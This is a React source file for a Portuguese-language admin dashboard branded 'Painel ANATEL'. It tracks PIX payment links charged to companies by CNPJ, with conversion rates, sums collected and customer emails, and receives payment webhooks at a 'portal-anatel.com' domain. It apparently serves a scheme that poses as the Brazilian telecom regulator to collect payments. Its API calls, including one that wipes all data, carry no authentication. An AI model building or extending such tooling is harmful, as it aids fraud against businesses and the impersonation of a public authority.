import React, { useState, useEffect } from 'react';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

// Webhook de Produção
const WEBHOOK_PRODUCAO = "https://portal-anatel.com/api/webhook/zippify";

export default function PainelPage() {
  // Auth
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loginError, setLoginError] = useState('');
  const [loginLoading, setLoginLoading] = useState(false);

  // Data
  const [stats, setStats] = useState(null);
  const [transactions, setTransactions] = useState([]);
  const [webhookLogs, setWebhookLogs] = useState([]);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState('links');
  const [filterStatus, setFilterStatus] = useState('');
  const [showResetModal, setShowResetModal] = useState(false);

  // Check if already logged in
  useEffect(() => {
    const token = localStorage.getItem('painel_token');
    if (token) {
      setIsLoggedIn(true);
    }
  }, []);

  const handleLogin = async (e) => {
    e.preventDefault();
    setLoginLoading(true);
    setLoginError('');

    try {
      const { data } = await axios.post(`${API}/auth/login`, {
        username,
        password
      });
      
      localStorage.setItem('painel_token', data.access_token);
      setIsLoggedIn(true);
    } catch (err) {
      setLoginError('Usuário ou senha incorretos');
    } finally {
      setLoginLoading(false);
    }
  };

  const handleLogout = () => {
    localStorage.removeItem('painel_token');
    setIsLoggedIn(false);
    setUsername('');
    setPassword('');
  };

  const resetStats = async () => {
    try {
      setLoading(true);
      await axios.post(`${API}/stats/reset`);
      setShowResetModal(false);
      fetchData();
      alert('✅ Estatísticas zeradas com sucesso!');
    } catch (err) {
      console.error('Erro ao zerar:', err);
      alert('❌ Erro ao zerar estatísticas');
    } finally {
      setLoading(false);
    }
  };

  const fetchData = async () => {
    try {
      const [statsRes, txRes, logsRes] = await Promise.all([
        axios.get(`${API}/stats/links`),
        axios.get(`${API}/stats/links/details?limit=50${filterStatus ? `&status=${filterStatus}` : ''}`),
        axios.get(`${API}/webhook/logs?limit=30`)
      ]);
      setStats(statsRes.data);
      setTransactions(txRes.data.transactions || []);
      setWebhookLogs(logsRes.data.logs || []);
    } catch (err) {
      console.error('Erro ao buscar dados:', err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (isLoggedIn) {
      fetchData();
      const interval = setInterval(fetchData, 10000);
      return () => clearInterval(interval);
    }
  }, [filterStatus, isLoggedIn]);

  const formatDate = (d) => d ? new Date(d).toLocaleString('pt-BR') : '-';
  const fmt = (v) => new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(v || 0);

  const getStatusColor = (status) => {
    switch (status) {
      case 'paid': return 'bg-green-500';
      case 'waiting_payment': return 'bg-yellow-500';
      case 'expired': return 'bg-red-500';
      default: return 'bg-gray-500';
    }
  };

  const getStatusLabel = (status) => {
    switch (status) {
      case 'paid': return 'PAGO';
      case 'waiting_payment': return 'PENDENTE';
      case 'expired': return 'EXPIRADO';
      default: return status?.toUpperCase() || 'N/A';
    }
  };

  // Login Screen
  if (!isLoggedIn) {
    return (
      <div className="min-h-screen bg-[#071D41] flex items-center justify-center">
        <div className="bg-gray-800 rounded-lg p-8 w-full max-w-sm">
          <div className="text-center mb-6">
            <img 
              src="https://customer-assets.emergentagent.com/job_lead-conversion-9/artifacts/ktf9iqob_pngwing.com.png"
              alt="ANATEL"
              className="w-16 h-auto mx-auto mb-4"
            />
            <h1 className="text-xl font-bold text-white">Painel Administrativo</h1>
          </div>
          
          <form onSubmit={handleLogin}>
            <div className="mb-4">
              <input
                type="text"
                placeholder="Usuário"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full px-4 py-3 bg-gray-700 text-white rounded border border-gray-600 focus:border-blue-500 focus:outline-none"
              />
            </div>
            <div className="mb-4">
              <input
                type="password"
                placeholder="Senha"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-4 py-3 bg-gray-700 text-white rounded border border-gray-600 focus:border-blue-500 focus:outline-none"
              />
            </div>
            
            {loginError && (
              <p className="text-red-400 text-sm mb-4 text-center">{loginError}</p>
            )}
            
            <button
              type="submit"
              disabled={loginLoading}
              className="w-full py-3 bg-blue-600 hover:bg-blue-700 text-white font-bold rounded disabled:opacity-50"
            >
              {loginLoading ? 'Entrando...' : 'Entrar'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  // Loading
  if (loading && !stats) {
    return (
      <div className="min-h-screen bg-[#071D41] flex items-center justify-center">
        <div className="text-white text-xl">Carregando...</div>
      </div>
    );
  }

  // Dashboard
  return (
    <div className="min-h-screen bg-gray-900 text-white">
      {/* Header */}
      <header className="bg-[#071D41] border-b border-gray-700 px-6 py-4">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-4">
            <img 
              src="https://customer-assets.emergentagent.com/job_lead-conversion-9/artifacts/ktf9iqob_pngwing.com.png"
              alt="ANATEL"
              className="w-12 h-auto"
            />
            <div>
              <h1 className="text-xl font-bold">Painel ANATEL</h1>
              <p className="text-gray-400 text-sm">Controle de Links e Pagamentos</p>
            </div>
          </div>
          <div className="flex items-center gap-3">
            <span className="text-xs text-gray-500">Auto-refresh: 10s</span>
            <button 
              onClick={fetchData}
              className="px-3 py-2 bg-blue-600 hover:bg-blue-700 rounded text-sm font-medium"
            >
              🔄
            </button>
            <button 
              onClick={() => setShowResetModal(true)}
              className="px-3 py-2 bg-red-600 hover:bg-red-700 rounded text-sm font-medium"
            >
              🗑️
            </button>
            <button 
              onClick={handleLogout}
              className="px-3 py-2 bg-gray-600 hover:bg-gray-500 rounded text-sm font-medium"
            >
              Sair
            </button>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-6 py-6">
        {/* Cards de Estatísticas */}
        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-3 mb-6">
          <div className="bg-gray-800 rounded-lg p-4">
            <p className="text-gray-400 text-xs uppercase">PIX Gerados</p>
            <p className="text-2xl font-bold text-white">{stats?.total_pix_gerados || 0}</p>
          </div>
          <div className="bg-gray-800 rounded-lg p-4">
            <p className="text-gray-400 text-xs uppercase">Pagos</p>
            <p className="text-2xl font-bold text-green-400">{stats?.pix_pagos || 0}</p>
          </div>
          <div className="bg-gray-800 rounded-lg p-4">
            <p className="text-gray-400 text-xs uppercase">Pendentes</p>
            <p className="text-2xl font-bold text-yellow-400">{stats?.pix_pendentes || 0}</p>
          </div>
          <div className="bg-gray-800 rounded-lg p-4">
            <p className="text-gray-400 text-xs uppercase">Conversão</p>
            <p className="text-2xl font-bold text-blue-400">{stats?.taxa_conversao || 0}%</p>
          </div>
          <div className="bg-gray-800 rounded-lg p-4">
            <p className="text-gray-400 text-xs uppercase">Arrecadado</p>
            <p className="text-xl font-bold text-green-400">{fmt(stats?.valor_arrecadado)}</p>
          </div>
          <div className="bg-gray-800 rounded-lg p-4">
            <p className="text-gray-400 text-xs uppercase">CNPJs</p>
            <p className="text-2xl font-bold text-purple-400">{stats?.cnpjs_unicos || 0}</p>
          </div>
        </div>

        {/* Tabs */}
        <div className="flex gap-2 mb-4">
          <button
            onClick={() => setActiveTab('links')}
            className={`px-4 py-2 rounded font-medium text-sm ${activeTab === 'links' ? 'bg-blue-600' : 'bg-gray-700 hover:bg-gray-600'}`}
          >
            📊 Transações
          </button>
          <button
            onClick={() => setActiveTab('webhook')}
            className={`px-4 py-2 rounded font-medium text-sm ${activeTab === 'webhook' ? 'bg-blue-600' : 'bg-gray-700 hover:bg-gray-600'}`}
          >
            🔗 Webhook
          </button>
        </div>

        {/* Tab: Links/Transações */}
        {activeTab === 'links' && (
          <div className="bg-gray-800 rounded-lg overflow-hidden">
            <div className="px-4 py-3 bg-gray-700 flex items-center gap-4">
              <select
                value={filterStatus}
                onChange={(e) => setFilterStatus(e.target.value)}
                className="bg-gray-600 text-white px-3 py-1 rounded text-sm"
              >
                <option value="">Todos</option>
                <option value="paid">Pagos</option>
                <option value="waiting_payment">Pendentes</option>
              </select>
              <span className="text-sm text-gray-400 ml-auto">{transactions.length} registros</span>
            </div>

            <div className="overflow-x-auto max-h-[400px] overflow-y-auto">
              <table className="w-full text-xs">
                <thead className="bg-gray-700 text-gray-300 sticky top-0">
                  <tr>
                    <th className="px-3 py-2 text-left">CNPJ</th>
                    <th className="px-3 py-2 text-left">Empresa</th>
                    <th className="px-3 py-2 text-right">Valor</th>
                    <th className="px-3 py-2 text-center">Status</th>
                    <th className="px-3 py-2 text-left">Data</th>
                    <th className="px-3 py-2 text-left">Pago em</th>
                  </tr>
                </thead>
                <tbody>
                  {transactions.map((tx, i) => (
                    <tr key={i} className="border-t border-gray-700 hover:bg-gray-700/50">
                      <td className="px-3 py-2 font-mono">{tx.cnpj}</td>
                      <td className="px-3 py-2 max-w-[150px] truncate">{tx.nome}</td>
                      <td className="px-3 py-2 text-right font-medium">{fmt(tx.valor)}</td>
                      <td className="px-3 py-2 text-center">
                        <span className={`px-2 py-0.5 rounded text-[10px] font-bold text-white ${getStatusColor(tx.status)}`}>
                          {getStatusLabel(tx.status)}
                        </span>
                      </td>
                      <td className="px-3 py-2 text-gray-400">{formatDate(tx.created_at)}</td>
                      <td className="px-3 py-2 text-green-400">{tx.paid_at ? formatDate(tx.paid_at) : '-'}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* Tab: Webhook */}
        {activeTab === 'webhook' && (
          <div className="space-y-4">
            <div className="bg-gray-800 rounded-lg p-4">
              <p className="text-xs text-gray-400 mb-2">URL do Webhook (Produção):</p>
              <div className="flex items-center gap-2">
                <code className="flex-1 bg-gray-900 px-3 py-2 rounded text-green-400 font-mono text-sm">
                  {WEBHOOK_PRODUCAO}
                </code>
                <button
                  onClick={() => { navigator.clipboard.writeText(WEBHOOK_PRODUCAO); alert('Copiado!'); }}
                  className="px-3 py-2 bg-green-600 hover:bg-green-700 rounded text-sm"
                >
                  📋
                </button>
              </div>
            </div>

            <div className="bg-gray-800 rounded-lg overflow-hidden">
              <div className="px-4 py-2 bg-gray-700 text-sm font-medium">
                Últimos Webhooks ({webhookLogs.length})
              </div>
              <div className="divide-y divide-gray-700 max-h-[350px] overflow-y-auto">
                {webhookLogs.length === 0 ? (
                  <div className="p-6 text-center text-gray-500">Nenhum webhook recebido</div>
                ) : (
                  webhookLogs.map((log, i) => (
                    <div key={i} className="p-3 hover:bg-gray-700/50 text-xs">
                      <div className="flex items-center justify-between mb-1">
                        <span className="text-gray-500">{formatDate(log.received_at)}</span>
                        <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${log.processed ? 'bg-green-600' : 'bg-yellow-600'}`}>
                          {log.processed ? '✅' : '⏳'}
                        </span>
                      </div>
                      <div className="flex gap-4 text-gray-400">
                        <span>Email: <span className="text-yellow-400">{log.payload?.customer?.email || 'N/A'}</span></span>
                        <span>TX: <span className="text-blue-400">{log.transaction_id || 'N/A'}</span></span>
                        <span>Por: <span className="text-purple-400">{log.search_method || 'N/A'}</span></span>
                      </div>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        )}
      </main>

      {/* Modal Reset */}
      {showResetModal && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
          <div className="bg-gray-800 rounded-lg p-6 max-w-sm w-full mx-4">
            <h2 className="text-lg font-bold text-red-400 mb-3">⚠️ Zerar tudo?</h2>
            <p className="text-gray-400 text-sm mb-4">Remove todas as transações e logs. CNPJs mantidos.</p>
            <div className="flex gap-3">
              <button onClick={() => setShowResetModal(false)} className="flex-1 px-4 py-2 bg-gray-600 rounded">Cancelar</button>
              <button onClick={resetStats} className="flex-1 px-4 py-2 bg-red-600 rounded">Confirmar</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
